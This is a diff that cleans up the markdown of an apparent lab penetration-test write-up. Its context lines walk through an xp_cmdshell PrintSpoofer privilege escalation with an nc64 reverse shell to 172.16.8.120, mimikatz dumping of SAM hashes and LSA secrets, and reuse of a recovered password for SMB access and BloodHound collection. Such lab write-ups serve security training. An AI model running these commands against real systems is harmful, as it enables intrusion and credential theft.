@@ -1131,17 +1131,13 @@ Running `xp_cmdshell 'whoami /priv';` reveals the SQL service account holds `SeI
 
 `xp_cmdshell` is used to trigger PrintSpoofer with a reverse shell payload:
 
-sql
-
 ```sql
 xp_cmdshell 'c:\dotnetnuke\portals\0\PrintSpoofer64.exe -c "c:\dotnetnuke\portals\0\nc64.exe 172.16.8.120 9001 -e cmd"';
 ```
 
-./dev01/7.png
+![](./dev01/3.png)
 
 A shell as `nt authority\system` is received:
-
-bash
 
 ```bash
 $ nc -lvnp 9001
@@ -1184,11 +1180,11 @@ K33p_0n_sp00fing!
 
 `mimikatz.exe` is uploaded to `C:\DotNetNuke\Portals\0` and run as `nt authority\system`:
 
-bash
-
 ```bash
 c:\DotNetNuke\Portals\0>.\mimikatz.exe
 ```
+
+Dumping the local Security Account Manager (SAM) NT hashes:
 
 ```
 mimikatz # privilege::debug
@@ -1211,9 +1207,9 @@ User : mpalledorous
   Hash NTLM: 3bb874a52ce7b0d64ee2a82bbf3fe1cc
 ```
 
-bash
+`lsadump::secrets` can be used to [dump LSA secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets) from the registries.
 
-```bash
+```
 mimikatz # lsadump::secrets
 ```
 
@@ -1228,8 +1224,6 @@ Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : NT S
 ```
 
 Local users on the host:
-
-bash
 
 ```bash
 dir c:\users
@@ -1251,8 +1245,6 @@ dir c:\users
 
 The recovered `DefaultPassword` secret, `Gr8hambino!`, is valid for the domain user `hporter`:
 
-bash
-
 ```bash
 nxc smb 172.16.8.3 -u hporter -p Gr8hambino! --shares
 ```
@@ -1269,8 +1261,6 @@ SMB         172.16.8.3      445    DC01             SYSVOL          READ        
 
 BloodHound data is collected using this account:
 
-bash
-
 ```bash
 sudo bloodhound-python -u 'hporter' -p 'Gr8hambino!' -ns 172.16.8.3 -d INLANEFREIGHT.LOCAL -c all --zip
 ```
@@ -1282,7 +1272,7 @@ INFO: Compressing output into 20261113132230_bloodhound.zip
 
 ---
 
-## ACL Abuse — ForceChangePassword
+## ForceChangePassword
 
 Analysis of the collected data shows `hporter` holds `ForceChangePassword` over `ssmalls`:
 
